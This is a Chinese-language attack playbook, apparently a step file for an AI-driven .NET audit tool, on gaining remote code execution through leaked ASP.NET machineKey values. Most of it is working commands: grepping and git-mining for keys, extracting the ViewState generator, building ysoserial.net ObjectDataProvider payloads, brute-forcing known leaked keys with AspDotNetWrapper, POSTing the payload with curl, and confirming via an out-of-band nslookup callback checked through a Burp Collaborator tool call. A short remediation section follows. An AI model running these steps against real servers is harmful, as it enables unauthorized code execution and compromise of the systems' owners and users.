# ViewState / MachineKey RCE — 攻击全流程

> 触发场景：dotnet-audit 成立条件判断表命中 ViewState/MachineKey 项后，执行本文档步骤。

---

## 漏洞原理

ASP.NET WebForms 使用 `machineKey`（validationKey + decryptionKey）对 `__VIEWSTATE` 进行签名/加密。
攻击者获得密钥后，可用 ysoserial.net 构造包含反序列化 payload 的恶意 ViewState，服务端解密验证通过后触发 RCE。

---

## 第一步：判断 machineKey 状态

### 方法一：直接读取配置文件

```bash
# Web.config（经典 WebForms 项目）
grep -n "machineKey" Web.config

# 目标格式：
# <machineKey validationAlg="SHA1"
#             validationKey="AAAABBBBCCCC..."
#             decryptionAlg="AES"
#             decryptionKey="XXXXYYYYZZZZ..." />
```

```bash
# machine.config（全局默认，Windows Server）
# 路径：C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
grep -n "machineKey" /path/to/machine.config
```

### 方法二：检测自动生成（高危：每次重启密钥不同，但 webfarm 场景常有硬编码）

```bash
# 若 Web.config 无 machineKey 且 framework < 4.0 → 全局默认密钥（有公开列表）
# 若 Web.config 无 machineKey 且 framework 4.0+ → 自动生成，通常不可攻击
grep -c "machineKey" Web.config  # 返回 0 且版本 < 4.0 → 检查公开默认密钥列表
```

### 已知默认/泄露 MachineKey 列表（立即触发 CoT 验证）

| 来源 | validationKey 特征 |
|------|-------------------|
| 微软 MSDN 文档示例 | `"AutoGenerate"` 或文档中的示例值 |
| ASP.NET 脚手架默认 | 全0或全F padding |
| GitHub 泄露（常见 CMS）| 通过 GitHub 搜索 `filename:web.config machineKey` |
| 公开漏洞利用 | [BlackList3r 工具包含已知泄露密钥数据库] |

### 方法三：泄露路径检测

```bash
# web.config 源码泄露（IIS 短文件名攻击或 git 泄露）
# .git/config 中搜索是否有 Web.config 历史提交
git log --all --full-history -- "Web.config" 2>/dev/null
git show HEAD:Web.config 2>/dev/null | grep machineKey
```

---

## 第二步：提取关键参数

从 ViewState 表单字段获取 `__VIEWSTATE_GENERATOR`（确定路径相关 generator 值）：

```bash
# 用 curl 请求目标页面，提取隐藏字段
curl -s https://target.com/default.aspx | grep -E "__VIEWSTATE_GENERATOR|__VIEWSTATE"

# 示例输出：
# <input type="hidden" name="__VIEWSTATE_GENERATOR" value="CA0B0334" />
```

---

## 第三步：生成恶意 ViewState

### 使用 ysoserial.net

```bash
# 基础 RCE（OOB Collaborator 验证）
ysoserial.exe -p ViewState \
  -g ObjectDataProvider \
  -c "nslookup <collaborator_payload>" \
  --validationalg="SHA1" \
  --validationkey="<实际 validationKey，不含空格>" \
  --generator="CA0B0334" \
  --path="/default.aspx" \
  --islegacy

# 若使用加密（有 decryptionKey）
ysoserial.exe -p ViewState \
  -g ObjectDataProvider \
  -c "nslookup <collaborator_payload>" \
  --validationalg="SHA1" \
  --validationkey="<validationKey>" \
  --decryptionalg="AES" \
  --decryptionkey="<decryptionKey>" \
  --generator="CA0B0334" \
  --path="/default.aspx"
```

> **命令说明**：
> - `--islegacy`：.NET 2.0/3.5 格式
> - `--generator`：必须与目标页面 `__VIEWSTATE_GENERATOR` 匹配，否则服务端拒绝
> - `--path`：目标 aspx 文件路径（影响 generator 计算）

### 使用 BlackList3r（当密钥未知，尝试已知密钥爆破）

```bash
# AspDotNetWrapper 快速爆破已知泄露密钥
AspDotNetWrapper.exe --keypath MachineKeys.txt \
  --encrypteddata "<捕获的__VIEWSTATE值>" \
  --purpose=viewstate \
  --IIIEnctype=Legacy
```

---

## 第四步：发送 Payload

```bash
# URL 编码处理（ViewState 含 + / = 需编码）
PAYLOAD=$(ysoserial.exe ... | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))")

# POST 请求（含其他必要表单字段）
curl -X POST https://target.com/default.aspx \
  -d "__VIEWSTATE=${PAYLOAD}&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=..." \
  -H "Content-Type: application/x-www-form-urlencoded"

# 等待 15s 后检查 Collaborator 回调
burp:get_collaborator_interactions(payloadId=<collab_id>)
```

---

## 成立条件细化（对应 dotnet-audit 判断表）

| 条件 | 说明 | 判定 |
|------|------|------|
| `machineKey` 硬编码且已读取到值 | 可直接生成 payload | ✅ Confirmed |
| `enableViewStateMac="false"` | ViewState 无签名验证，任意篡改 | ✅ Confirmed（不需要 machineKey）|
| `machineKey` 使用已知泄露密钥之一 | BlackList3r 验证 | ✅ Confirmed |
| `machineKey` 不存在 + .NET 4.0+ | 自动生成，每重启变化 | ❌ 不可利用（除非 webfarm 同步） |
| `machineKey` 不存在 + .NET < 4.0 | 使用框架默认密钥 | 🔍 Hypothesis（检查已知默认列表）|
| ASP.NET Core（无 WebForms）| ViewState 不存在 | ❌ 不适用 |

---

## 修复建议

```xml
<!-- 1. 随机生成强密钥（不要使用文档示例值）-->
<machineKey
  validationKey="[64字节随机hex]"
  decryptionKey="[32字节随机hex]"
  validation="HMACSHA256"
  decryption="AES" />

<!-- 2. 启用 ViewState 加密 -->
<pages enableViewStateMac="true" viewStateEncryptionMode="Always" />

<!-- 3. 迁移到 ASP.NET Core（从根本上消除 ViewState 攻击面）-->
```

---

## 参考

- BlackList3r: https://github.com/NotSoSecure/Blacklist3r
- ysoserial.net ViewState plugin: https://github.com/pwntester/ysoserial.net
- 微软安全公告 MS10-070（MachineKey 暴露）
